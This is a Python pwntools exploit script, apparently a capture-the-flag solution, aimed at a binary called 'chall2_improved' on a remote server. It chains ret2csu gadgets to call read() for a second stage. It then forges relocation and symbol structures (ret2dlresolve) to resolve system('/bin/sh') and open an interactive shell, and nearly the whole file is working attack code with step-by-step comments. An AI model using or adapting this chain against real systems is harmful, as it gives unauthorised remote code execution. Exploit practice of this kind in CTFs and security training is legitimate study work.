#!/usr/bin/env python3

from pwn import *
import time

e = ELF("./chall2_improved")
r = remote("3.99.48.161",9004)
#r = process("./chall2")
time.sleep(1.0)
detonator = b'A' * 40
detonator+=p64(0x401202)        #return to CSU Gadget 1 to setup some regs for the CSU gadget 2 
detonator+=p64(0)               #null out the rbx 
detonator+=p64(1)               #There will a compare present to see whether rbp and rbx equal after a add rbx,0x1 So give 1 to rbp as rbx is 0
detonator+=p64(0)               #Null out the r12 register as this will be passed to edi register which holds the first argument fd
detonator+=p64(0x404050)        #The location where my second input will be placed
detonator+=p64(0x200)           #The size of my second input
detonator+=p64(0x403e38)        #The location where the address of init is placed to make the indirect call
detonator+=p64(0x4011e8)        #Return to CSU Gadget 2 to finally setup the 3 arguement regs needed for read()
detonator+=p64(0) * 7           #After our 3 main regs have been set we can give any junk values to the other regs i chose null here
detonator+=p64(0x401040)        #Make the read call to get the second input
detonator+=p64(0x40120b)        #Finally after getting the input place the string /bin/sh in rdi register
detonator+=p64(0x404058)        #Location of /bin/sh string
detonator+=p64(0x401020)        #Return to .plt section with fake large relocation arg at the top of the stack
detonator+=p64(0x280) #Fake reloc arg
file_handle = open("exploit2.txt","wb")
file_handle.write(detonator + b'A' * (512 - len(detonator)))
r.send(detonator)               
time.sleep(0.2)       
bomb = b'system\x00\x00' + b'/bin/sh\x00' #st_name system and the /bin/sh string for arg
bomb+=p64(0x404018)                       #Fake rel and sym structs to resolve system function
bomb+=p64(0x29000000007)
bomb+=p64(0) * 7
bomb+=p64(0x1200003c98)
bomb+=p64(0) * 2
r.send(bomb)               
file_handle.write(bomb)
file_handle.close()
time.sleep(0.2)
r.interactive()                #Boom!! You got a shell
